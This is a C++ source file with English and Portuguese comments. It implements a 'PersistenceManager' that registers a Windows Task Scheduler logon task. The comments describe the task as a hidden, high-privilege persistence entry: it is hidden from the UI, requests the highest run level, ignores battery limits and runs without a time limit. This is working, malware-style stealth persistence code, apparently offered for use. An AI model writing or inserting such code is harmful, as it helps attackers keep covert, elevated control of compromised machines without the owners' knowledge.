#include <initguid.h>
#include "PersistenceManager.hpp"

// --- COM SMART POINTER DEFINITIONS / DEFINIÇÕES DE SMART POINTERS COM ---

_COM_SMARTPTR_TYPEDEF(ITaskService, __uuidof(ITaskService));
_COM_SMARTPTR_TYPEDEF(ITaskDefinition, __uuidof(ITaskDefinition));
_COM_SMARTPTR_TYPEDEF(ITaskFolder, __uuidof(ITaskFolder));
_COM_SMARTPTR_TYPEDEF(ITriggerCollection, __uuidof(ITriggerCollection));
_COM_SMARTPTR_TYPEDEF(ITrigger, __uuidof(ITrigger));
_COM_SMARTPTR_TYPEDEF(IActionCollection, __uuidof(IActionCollection));
_COM_SMARTPTR_TYPEDEF(IAction, __uuidof(IAction));
_COM_SMARTPTR_TYPEDEF(IExecAction, __uuidof(IExecAction));
_COM_SMARTPTR_TYPEDEF(IRegisteredTask, __uuidof(IRegisteredTask));
_COM_SMARTPTR_TYPEDEF(ITaskSettings, __uuidof(ITaskSettings));
_COM_SMARTPTR_TYPEDEF(IPrincipal, __uuidof(IPrincipal));

// --- PERSISTENCE MANAGER: LOGON TASK CREATION / GERENCIADOR DE PERSISTÊNCIA ---

// Creates a hidden, high-privilege Windows Task Scheduler logon persistence entry
// Cria uma entrada de persistência oculta e de alto privilégio no Agendador de Tarefas do Windows no logon
bool PersistenceManager::CreateLogonTask(const std::wstring& taskName, const std::wstring& exePath) {
    // Initialize COM library for multi-threaded concurrency
    // Inicializa a biblioteca COM para concorrência multi-threaded
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return false;

    try {
        // Connect to the Task Scheduler service
        // Conecta ao serviço do Agendador de Tarefas
        ITaskServicePtr pService;
        hr = pService.CreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER);
        if (FAILED(hr)) throw hr;

        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr)) throw hr;

        // Create a new task definition instance
        // Cria uma nova instância de definição de tarefa
        ITaskDefinitionPtr pTask;
        hr = pService->NewTask(0, &pTask);

        // Configure execution settings (battery behavior, hidden flag, infinite execution limit)
        // Configura as opções de execução (comportamento de bateria, flag de ocultação, limite de execução infinito)
        ITaskSettingsPtr pSettings;
        hr = pTask->get_Settings(&pSettings);
        if (SUCCEEDED(hr)) {
            pSettings->put_StartWhenAvailable(VARIANT_TRUE);

            // Ignore battery restriction / Ignora se estiver na bateria
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);

            // Keep running if unplugged / Não mata o processo se tirar da tomada
            pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);

            // Hide task from basic UI / Esconde a tarefa da interface básica
            pSettings->put_Hidden(VARIANT_TRUE);

            // Unlimited runtime / Tempo limite = 0 (Roda para sempre)
            pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S"));
        }
        
        // Configure security principal (interactive logon token, highest privileges)
        // Configura o principal de segurança (token de logon interativo, privilégios mais altos)
        IPrincipalPtr pPrincipal;
        hr = pTask->get_Principal(&pPrincipal);
        if (SUCCEEDED(hr)) {
            pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
            
            // Request highest available privileges / Pede os maiores privilégios disponíveis
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        }

        // Setup logon trigger for the task
        // Configura o gatilho de logon para a tarefa
        ITriggerCollectionPtr pTriggerCollection;
        hr = pTask->get_Triggers(&pTriggerCollection);
        
        ITriggerPtr pTrigger;
        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);

        // Setup execution action (binary path to execute)
        // Configura a ação de execução (caminho do binário a ser executado)
        IActionCollectionPtr pActionCollection;
        hr = pTask->get_Actions(&pActionCollection);
        
        IActionPtr pAction;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);

        IExecActionPtr pExecAction = pAction; 
        pExecAction->put_Path(_bstr_t(exePath.c_str()));

        // Access the root task folder
        // Acessa a pasta raiz de tarefas
        ITaskFolderPtr pRootFolder;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

        // Register or update the task in the system
        // Registra ou atualiza a tarefa no sistema
        IRegisteredTaskPtr pRegisteredTask;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(taskName.c_str()), 
            pTask, 
            TASK_CREATE_OR_UPDATE, 
            _variant_t(), _variant_t(), 
            TASK_LOGON_INTERACTIVE_TOKEN, 
            _variant_t(L""), 
            &pRegisteredTask
        );

    } catch (HRESULT) {
        // Cleanup COM on exception and fail gracefully
        // Limpa o COM em caso de exceção e falha com segurança
        CoUninitialize();
        return false;
    }

    // Uninitialize COM library and report success
    // Desinicializa a biblioteca COM e reporta sucesso
    CoUninitialize(); 
    return true;
}